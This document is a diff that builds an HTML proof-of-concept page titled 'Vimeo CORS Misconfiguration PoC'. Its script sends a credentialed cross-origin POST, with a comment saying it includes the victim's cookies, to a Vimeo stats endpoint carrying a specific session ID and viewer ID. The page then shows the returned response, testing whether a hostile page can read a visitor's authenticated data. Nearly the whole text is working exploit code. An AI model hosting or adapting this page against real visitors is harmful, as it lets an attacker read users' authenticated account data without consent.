@@ -1,11 +1,36 @@
-<script>
-fetch("https://arclight.vimeo.com/add/player-stats?beacon=1&session-id=xxx", {
-  method: "POST",
-  credentials: "include",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify([{ "autoplay": true, "viewer_id": 244943635 }])
-})
-.then(r => r.text())
-.then(d => alert(d))
-.catch(e => alert("failed: " + e));
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Vimeo CORS PoC</title>
+</head>
+<body>
+  <h1>Vimeo CORS Misconfiguration PoC</h1>
+  <p>If this works, victim’s browser will send their cookies to Vimeo and we’ll see the response here:</p>
+  <pre id="output">Waiting...</pre>
+
+  <script>
+    (async () => {
+      try {
+        const resp = await fetch("https://arclight.vimeo.com/add/player-stats?beacon=1&session-id=ee5275ad972ec12f2849f06e704a09b60c4cea741755882610", {
+          method: "POST",
+          credentials: "include",  // include victim’s cookies
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify([{
+            "autoplay": false,
+            "viewer_id": 244943635,
+            "session_id": "ee5275ad972ec12f2849f06e704a09b60c4cea741755882610",
+            "name": "cors-poc"
+          }])
+        });
+
+        const text = await resp.text();
+        document.getElementById("output").textContent = text;
+      } catch (e) {
+        document.getElementById("output").textContent = "Request failed: " + e;
+      }
+    })();
+  </script>
+</body>
+</html>
